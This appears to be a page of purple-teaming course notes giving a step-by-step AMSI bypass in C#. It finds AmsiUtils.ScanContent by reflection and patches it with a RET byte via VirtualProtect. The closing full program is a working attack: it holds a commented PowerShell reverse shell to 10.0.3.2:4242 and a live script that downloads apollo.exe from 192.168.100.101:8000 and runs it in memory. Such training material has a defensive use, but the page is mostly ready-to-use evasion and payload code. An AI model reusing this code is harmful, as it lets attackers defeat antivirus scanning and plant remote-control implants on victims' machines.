---
layout: default
title: "Full AMSI Bypass"
permalink: /solo-purple-teaming/full-amsi-bypass/
---
<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Full AMSI Bypass</h1>
</section>
<section class="spt-content">
<h1 id="1-foundation-review"><strong>1. Foundation Review</strong></h1>
<p>Before diving into code, recall:</p>
<ul>
<li><strong>AMSI (Anti-Malware Scan Interface)</strong>:
<ul>
<li>Microsoft feature for integrating apps/services with AV solutions
like Windows Defender.</li>
<li>Detects malicious activity in real time.</li>
<li>Especially useful for script-based attacks (PowerShell, JavaScript,
VBScript), macros, and fileless malware.</li>
</ul></li>
<li><strong><code>AmsiUtils</code> in .NET</strong>:
<ul>
<li>Managed wrapper for native AMSI functions
(<code>AmsiScanBuffer</code>, etc.).</li>
<li>Since it’s managed code, attackers can iterate loaded assemblies,
find, and patch key AMSI functions.</li>
</ul></li>
</ul>
<hr />
<h3 id="2-project-setup"><strong>2. Project Setup</strong></h3>
<ul>
<li><p>Working in <strong>Windows 11 Reverse Engineering
VM</strong>.</p></li>
<li><p>Open <strong>GoodbyeAMSI</strong> project.</p></li>
<li><p>Initial run → Only two assemblies load (no AMSI
present).</p></li>
<li><p>AMSI lives in:</p>
System.Management.Automation
</li>
<li><p>To force AMSI to load:</p>
<ul>
<li>Execute a PowerShell command in a <strong>runspace</strong>.</li>
</ul></li>
</ul>
<hr />
<h3 id="3-adding-required-references"><strong>3. Adding Required
References</strong></h3>
<ol type="1">
<li><p>Add reference to:</p>
System.Management.Automation.dll

<ul>
<li>Browse to location if not already added.</li>
</ul></li>
<li><p>Create alias:</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> PowerShell <span class="op">=</span> System<span class="op">.</span><span class="fu">Management</span><span class="op">.</span><span class="fu">Automation</span><span class="op">.</span><span class="fu">PowerShell</span><span class="op">;</span></span></code></pre></div></li>
</ol>
<hr />
<h3 id="4-importing-virtualprotect"><strong>4. Importing
VirtualProtect</strong></h3>
<ul>
<li>Needed to change memory permissions for patching:</li>
</ul>
<div class="sourceCode" id="cb4"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="op">[</span><span class="fu">DllImport</span><span class="op">(</span><span class="st">"kernel32"</span><span class="op">)]</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="kw">static</span> <span class="kw">extern</span> <span class="dt">bool</span> <span class="fu">VirtualProtect</span><span class="op">(</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>    IntPtr lpAddress<span class="op">,</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">uint</span> dwSize<span class="op">,</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">uint</span> flNewProtect<span class="op">,</span></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">out</span> <span class="dt">uint</span> lpflOldProtect</span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="op">);</span></span></code></pre></div>
<hr />
<h3 id="5-forcing-amsi-to-load"><strong>5. Forcing AMSI to
Load</strong></h3>
<ul>
<li>Create PowerShell instance and run a simple command:</li>
</ul>
<div class="sourceCode" id="cb5"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> <span class="op">(</span><span class="dt">var</span> ps <span class="op">=</span> PowerShell<span class="op">.</span><span class="fu">Create</span><span class="op">())</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    ps<span class="op">.</span><span class="fu">AddCommand</span><span class="op">(</span><span class="st">"Get-Process"</span><span class="op">).</span><span class="fu">Invoke</span><span class="op">();</span></span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<ul>
<li>Verify <strong><code>System.Management.Automation</code></strong>
now appears in loaded assemblies.</li>
</ul>
<hr />
<h3 id="6-locating-amsiutils"><strong>6. Locating
AmsiUtils</strong></h3>
<ul>
<li>Iterate loaded assemblies:</li>
</ul>
<div class="sourceCode" id="cb6"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">if</span> <span class="op">(</span>assembly<span class="op">.</span><span class="fu">FullName</span><span class="op">.</span><span class="fu">Contains</span><span class="op">(</span><span class="st">"System.Management.Automation"</span><span class="op">))</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    Console<span class="op">.</span><span class="fu">WriteLine</span><span class="op">(</span>assembly<span class="op">.</span><span class="fu">FullName</span><span class="op">);</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<ul>
<li>Then find types inside:</li>
</ul>
<div class="sourceCode" id="cb7"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">foreach</span> <span class="op">(</span><span class="dt">var</span> type <span class="kw">in</span> assembly<span class="op">.</span><span class="fu">GetTypes</span><span class="op">())</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">if</span> <span class="op">(</span>type<span class="op">.</span><span class="fu">FullName</span><span class="op">.</span><span class="fu">Contains</span><span class="op">(</span><span class="st">"AmsiUtils"</span><span class="op">))</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>        Console<span class="op">.</span><span class="fu">WriteLine</span><span class="op">(</span>type<span class="op">.</span><span class="fu">FullName</span><span class="op">);</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<hr />
<h3 id="7-finding-the-target-method-scancontent"><strong>7. Finding the
Target Method (<code>ScanContent</code>)</strong></h3>
<ul>
<li>Iterate runtime methods:</li>
</ul>
<div class="sourceCode" id="cb8"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">foreach</span> <span class="op">(</span><span class="dt">var</span> method <span class="kw">in</span> type<span class="op">.</span><span class="fu">GetRuntimeMethods</span><span class="op">())</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">if</span> <span class="op">(</span>method<span class="op">.</span><span class="fu">Name</span> <span class="op">==</span> <span class="st">"ScanContent"</span><span class="op">)</span></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>        Console<span class="op">.</span><span class="fu">WriteLine</span><span class="op">(</span>method<span class="op">.</span><span class="fu">Name</span><span class="op">);</span></span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<hr />
<h3 id="8-understanding-jit-compilation"><strong>8. Understanding JIT
Compilation</strong></h3>
<ul>
<li>.NET uses <strong>lazy JIT</strong> → method is compiled only when
first called.</li>
<li>Need to <strong>force compilation</strong>:</li>
</ul>
<div class="sourceCode" id="cb9"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>RuntimeHelpers<span class="op">.</span><span class="fu">PrepareMethod</span><span class="op">(</span>method<span class="op">.</span><span class="fu">MethodHandle</span><span class="op">);</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>IntPtr ptr <span class="op">=</span> method<span class="op">.</span><span class="fu">MethodHandle</span><span class="op">.</span><span class="fu">GetFunctionPointer</span><span class="op">();</span></span></code></pre></div>
<hr />
<h3 id="9-creating-and-applying-the-patch"><strong>9. Creating and
Applying the Patch</strong></h3>
<ul>
<li>Patch: return immediately (x86/x64 RET opcode =
<code>0xC3</code>):</li>
</ul>
<div class="sourceCode" id="cb10"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="dt">byte</span><span class="op">[]</span> patch <span class="op">=</span> <span class="kw">new</span> <span class="dt">byte</span><span class="op">[]</span> <span class="op">{</span> <span class="bn">0xC3</span> <span class="op">};</span></span></code></pre></div>
<ul>
<li>Change memory permissions to writable:</li>
</ul>
<div class="sourceCode" id="cb11"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">VirtualProtect</span><span class="op">(</span>ptr<span class="op">,</span> <span class="op">(</span><span class="dt">uint</span><span class="op">)</span>patch<span class="op">.</span><span class="fu">Length</span><span class="op">,</span> <span class="bn">0x40</span><span class="op">,</span> <span class="kw">out</span> <span class="dt">uint</span> oldProtect<span class="op">);</span></span></code></pre></div>
<ul>
<li>Copy patch into memory:</li>
</ul>
<div class="sourceCode" id="cb12"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>Marshal<span class="op">.</span><span class="fu">Copy</span><span class="op">(</span>patch<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> ptr<span class="op">,</span> patch<span class="op">.</span><span class="fu">Length</span><span class="op">);</span></span></code></pre></div>
<hr />
<h3 id="10-executing-the-payload"><strong>10. Executing the
Payload</strong></h3>
<ol type="1">
<li>Define payload as a string:</li>
</ol>
<div class="sourceCode" id="cb13"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="dt">string</span> script <span class="op">=</span> <span class="st">"<reverse TCP PowerShell payload>"</span><span class="op">;</span></span></code></pre></div>
<ol type="1">
<li>Create and run:</li>
</ol>
<div class="sourceCode" id="cb14"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> <span class="op">(</span><span class="dt">var</span> ps <span class="op">=</span> PowerShell<span class="op">.</span><span class="fu">Create</span><span class="op">())</span></span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>    ps<span class="op">.</span><span class="fu">AddScript</span><span class="op">(</span>script<span class="op">).</span><span class="fu">Invoke</span><span class="op">();</span></span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<hr />
<h3 id="11-build-and-run"><strong>11. Build and Run</strong></h3>
<ul>
<li><p>Build for <strong>x64</strong> (set in Configuration Manager if
needed).</p></li>
<li><p>From command prompt, run:</p>
GoodbyeAMSI.exe
</li>
<li><p>Start listener before execution.</p></li>
<li><p>Successful run → reverse shell established.</p></li>
</ul>
<hr />
<h3 id="12-verification"><strong>12. Verification</strong></h3>
<ul>
<li>Check <strong>Windows Security</strong>:
<ul>
<li>Real-time protection → <strong>Enabled</strong></li>
<li>Device Guard → <strong>Enabled</strong></li>
</ul></li>
<li>Despite protections, payload executes successfully → AMSI bypass
works.</li>
</ul>
<hr />
<h3 id="13-next-steps"><strong>13. Next Steps</strong></h3>
<ul>
<li>In upcoming lectures:
<ul>
<li>Integrate <strong>Apollo agent</strong> into this initial access
vector.</li>
<li>Explore other AMSI bypass opportunities (e.g.,
<code>ScanBuffer</code>, native methods).</li>
<li>Expand technique to different payload types.</li>
</ul></li>
</ul>
<p>Full AMSI Bypass</p>
<div class="sourceCode" id="cb16"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">;</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">.</span><span class="fu">Reflection</span><span class="op">;</span></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">.</span><span class="fu">Runtime</span><span class="op">.</span><span class="fu">CompilerServices</span><span class="op">;</span></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">.</span><span class="fu">Runtime</span><span class="op">.</span><span class="fu">InteropServices</span><span class="op">;</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> PowerShell <span class="op">=</span> System<span class="op">.</span><span class="fu">Management</span><span class="op">.</span><span class="fu">Automation</span><span class="op">.</span><span class="fu">PowerShell</span><span class="op">;</span></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="kw">namespace</span> GoodByeAmsi</span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">internal</span> <span class="kw">class</span> Program</span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a>        <span class="op">[</span><span class="fu">DllImport</span><span class="op">(</span><span class="st">"kernel32.dll"</span><span class="op">)]</span></span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>        <span class="kw">static</span> <span class="kw">extern</span> <span class="dt">bool</span> <span class="fu">VirtualProtect</span><span class="op">(</span>IntPtr lpAddress<span class="op">,</span> <span class="dt">int</span> dwSize<span class="op">,</span> <span class="dt">uint</span> flNewProtect<span class="op">,</span> <span class="kw">out</span> <span class="dt">uint</span> lpflOldProtect<span class="op">);</span></span>
<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a>        <span class="kw">static</span> <span class="dt">void</span> <span class="fu">Main</span><span class="op">(</span><span class="dt">string</span><span class="op">[]</span> args<span class="op">)</span></span>
<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a>            PowerShell powershell <span class="op">=</span> PowerShell<span class="op">.</span><span class="fu">Create</span><span class="op">();</span></span>
<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a>            powershell<span class="op">.</span><span class="fu">AddCommand</span><span class="op">(</span><span class="st">"Get-Process"</span><span class="op">);</span></span>
<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a>            powershell<span class="op">.</span><span class="fu">Invoke</span><span class="op">();</span></span>
<span id="cb16-18"><a href="#cb16-18" aria-hidden="true" tabindex="-1"></a>            powershell<span class="op">.</span><span class="fu">Dispose</span><span class="op">();</span></span>
<span id="cb16-19"><a href="#cb16-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-20"><a href="#cb16-20" aria-hidden="true" tabindex="-1"></a>            <span class="kw">foreach</span> <span class="op">(</span><span class="dt">var</span> assembly <span class="kw">in</span> AppDomain<span class="op">.</span><span class="fu">CurrentDomain</span><span class="op">.</span><span class="fu">GetAssemblies</span><span class="op">())</span></span>
<span id="cb16-21"><a href="#cb16-21" aria-hidden="true" tabindex="-1"></a>            <span class="op">{</span></span>
<span id="cb16-22"><a href="#cb16-22" aria-hidden="true" tabindex="-1"></a>                <span class="kw">if</span> <span class="op">(</span>assembly<span class="op">.</span><span class="fu">FullName</span><span class="op">.</span><span class="fu">Contains</span><span class="op">(</span><span class="st">"System.Management.Automation"</span><span class="op">))</span></span>
<span id="cb16-23"><a href="#cb16-23" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
<span id="cb16-24"><a href="#cb16-24" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">foreach</span> <span class="op">(</span><span class="dt">var</span> module <span class="kw">in</span> assembly<span class="op">.</span><span class="fu">GetTypes</span><span class="op">())</span></span>
<span id="cb16-25"><a href="#cb16-25" aria-hidden="true" tabindex="-1"></a>                    <span class="op">{</span></span>
<span id="cb16-26"><a href="#cb16-26" aria-hidden="true" tabindex="-1"></a>                        <span class="kw">if</span><span class="op">(</span>module<span class="op">.</span><span class="fu">FullName</span><span class="op">.</span><span class="fu">Contains</span><span class="op">(</span><span class="st">"System.Management.Automation.AmsiUtils"</span><span class="op">))</span> <span class="op">{</span></span>
<span id="cb16-27"><a href="#cb16-27" aria-hidden="true" tabindex="-1"></a>                            <span class="kw">foreach</span><span class="op">(</span><span class="dt">var</span> method <span class="kw">in</span> module<span class="op">.</span><span class="fu">GetRuntimeMethods</span><span class="op">())</span></span>
<span id="cb16-28"><a href="#cb16-28" aria-hidden="true" tabindex="-1"></a>                            <span class="op">{</span></span>
<span id="cb16-29"><a href="#cb16-29" aria-hidden="true" tabindex="-1"></a>                                <span class="kw">if</span> <span class="op">(</span>method<span class="op">.</span><span class="fu">Name</span> <span class="op">==</span> <span class="st">"ScanContent"</span><span class="op">)</span></span>
<span id="cb16-30"><a href="#cb16-30" aria-hidden="true" tabindex="-1"></a>                                <span class="op">{</span></span>
<span id="cb16-31"><a href="#cb16-31" aria-hidden="true" tabindex="-1"></a>                                    RuntimeHelpers<span class="op">.</span><span class="fu">PrepareMethod</span><span class="op">(</span>method<span class="op">.</span><span class="fu">MethodHandle</span><span class="op">);</span></span>
<span id="cb16-32"><a href="#cb16-32" aria-hidden="true" tabindex="-1"></a>                                    IntPtr ptr <span class="op">=</span> method<span class="op">.</span><span class="fu">MethodHandle</span><span class="op">.</span><span class="fu">GetFunctionPointer</span><span class="op">();</span></span>
<span id="cb16-33"><a href="#cb16-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-34"><a href="#cb16-34" aria-hidden="true" tabindex="-1"></a>                                    <span class="dt">byte</span><span class="op">[]</span> patch <span class="op">=</span> <span class="kw">new</span> <span class="dt">byte</span><span class="op">[]</span> <span class="op">{</span> <span class="bn">0xC3</span> <span class="op">};</span></span>
<span id="cb16-35"><a href="#cb16-35" aria-hidden="true" tabindex="-1"></a>                                    <span class="fu">VirtualProtect</span><span class="op">(</span>ptr<span class="op">,</span> patch<span class="op">.</span><span class="fu">Length</span><span class="op">,</span> <span class="bn">0x40</span><span class="op">,</span> <span class="kw">out</span> <span class="dt">uint</span> oldProtect<span class="op">);</span></span>
<span id="cb16-36"><a href="#cb16-36" aria-hidden="true" tabindex="-1"></a>                                    Marshal<span class="op">.</span><span class="fu">Copy</span><span class="op">(</span>patch<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> ptr<span class="op">,</span> patch<span class="op">.</span><span class="fu">Length</span><span class="op">);</span></span>
<span id="cb16-37"><a href="#cb16-37" aria-hidden="true" tabindex="-1"></a>                                    <span class="kw">break</span><span class="op">;</span></span>
<span id="cb16-38"><a href="#cb16-38" aria-hidden="true" tabindex="-1"></a>                                <span class="op">}</span></span>
<span id="cb16-39"><a href="#cb16-39" aria-hidden="true" tabindex="-1"></a>                            <span class="op">}</span></span>
<span id="cb16-40"><a href="#cb16-40" aria-hidden="true" tabindex="-1"></a>                        <span class="op">}</span></span>
<span id="cb16-41"><a href="#cb16-41" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
<span id="cb16-42"><a href="#cb16-42" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
<span id="cb16-43"><a href="#cb16-43" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
<span id="cb16-44"><a href="#cb16-44" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-45"><a href="#cb16-45" aria-hidden="true" tabindex="-1"></a>            <span class="co">//string script = @"$client = New-Object System.Net.Sockets.TCPClient('10.0.3.2',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";</span></span>
<span id="cb16-46"><a href="#cb16-46" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-47"><a href="#cb16-47" aria-hidden="true" tabindex="-1"></a>            <span class="dt">string</span> script <span class="op">=</span> @<span class="st">"$bytes = (Invoke-WebRequest ""http://192.168.100.101:8000/apollo.exe"").Content;</span></span>
<span id="cb16-48"><a href="#cb16-48" aria-hidden="true" tabindex="-1"></a>                            $loadedAssembly <span class="op">=</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Reflection</span><span class="op">.</span><span class="fu">Assembly</span><span class="op">]::</span><span class="fu">Load</span><span class="op">(</span>$bytes<span class="op">);</span></span>
<span id="cb16-49"><a href="#cb16-49" aria-hidden="true" tabindex="-1"></a>                            $typeName <span class="op">=</span> <span class="st">""</span>Apollo<span class="op">.</span><span class="fu">Program</span><span class="st">""</span><span class="op">;</span></span>
<span id="cb16-50"><a href="#cb16-50" aria-hidden="true" tabindex="-1"></a>                            $type <span class="op">=</span> $loadedAssembly<span class="op">.</span><span class="fu">GetType</span><span class="op">(</span>$typeName<span class="op">);</span></span>
<span id="cb16-51"><a href="#cb16-51" aria-hidden="true" tabindex="-1"></a>                            $instance <span class="op">=</span> <span class="op">[</span>Activator<span class="op">]::</span><span class="fu">CreateInstance</span><span class="op">(</span>$type<span class="op">);</span></span>
<span id="cb16-52"><a href="#cb16-52" aria-hidden="true" tabindex="-1"></a>                            $methodName <span class="op">=</span> <span class="st">""</span>Execute<span class="st">""</span><span class="op">;</span></span>
<span id="cb16-53"><a href="#cb16-53" aria-hidden="true" tabindex="-1"></a>                            $method <span class="op">=</span> $type<span class="op">.</span><span class="fu">GetMethod</span><span class="op">(</span>$methodName<span class="op">);</span></span>
<span id="cb16-54"><a href="#cb16-54" aria-hidden="true" tabindex="-1"></a>                            $result <span class="op">=</span> $method<span class="op">.</span><span class="fu">Invoke</span><span class="op">(</span>$instance<span class="op">,</span> $null<span class="op">);</span><span class="st">";</span></span>
<span id="cb16-55"><a href="#cb16-55" aria-hidden="true" tabindex="-1"></a>            </span>
<span id="cb16-56"><a href="#cb16-56" aria-hidden="true" tabindex="-1"></a>            powershell <span class="op">=</span> PowerShell<span class="op">.</span><span class="fu">Create</span><span class="op">();</span></span>
<span id="cb16-57"><a href="#cb16-57" aria-hidden="true" tabindex="-1"></a>            powershell<span class="op">.</span><span class="fu">AddScript</span><span class="op">(</span>script<span class="op">);</span></span>
<span id="cb16-58"><a href="#cb16-58" aria-hidden="true" tabindex="-1"></a>            powershell<span class="op">.</span><span class="fu">Invoke</span><span class="op">();</span></span>
<span id="cb16-59"><a href="#cb16-59" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-60"><a href="#cb16-60" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb16-61"><a href="#cb16-61" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb16-62"><a href="#cb16-62" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
</section>
</div>
